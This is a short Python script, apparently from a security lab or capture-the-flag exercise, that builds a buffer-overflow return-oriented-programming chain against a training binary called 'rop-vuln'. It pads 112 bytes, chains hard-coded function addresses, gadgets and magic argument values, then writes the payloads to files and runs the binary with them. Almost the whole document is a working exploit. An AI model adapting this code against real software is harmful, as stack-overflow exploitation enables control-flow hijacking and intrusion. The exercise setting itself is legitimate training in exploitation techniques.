import struct
import os

#filename cambia indirizzo se passiamo gli argomenti da terminale
filename = 0xbffff1db

food = 0x80484f0
rop_gadget = 0x0804834d
magic = 0xdeadbeef


feeling_sick = 0x804853d
pop_pop_pop_ret = 0x080486e9 #0x080486a9 #0x08048509 
magic1 = 0xd15ea5e
magic2 = 0x0badf00d

lazy = 0x80484cb
exit = 0xb7e327f0

argv1 = "A"*112
argv1 += struct.pack("I", food)
argv1 += struct.pack("I",rop_gadget)
argv1 += struct.pack("I",magic)

argv1 += struct.pack("I",feeling_sick)
argv1 += struct.pack("I",pop_pop_pop_ret)
argv1 += struct.pack("I",magic1)
argv1 += struct.pack("I",magic2)
argv1 += struct.pack("I",filename)

argv1 += struct.pack("I",lazy)
argv1 += struct.pack("I",exit)


argv2 = "A"*50
argv2 += 'secret-file'

f = open('fla1', 'w+')
f.write(argv1)

f = open('fla2', 'w+')
f.write(argv2)
f.close()

#./rop-vuln  $(cat fla1) $(cat fla2)
os.system("./rop-vuln $(cat {}) $(cat {})".format('fla1', 'fla2'))


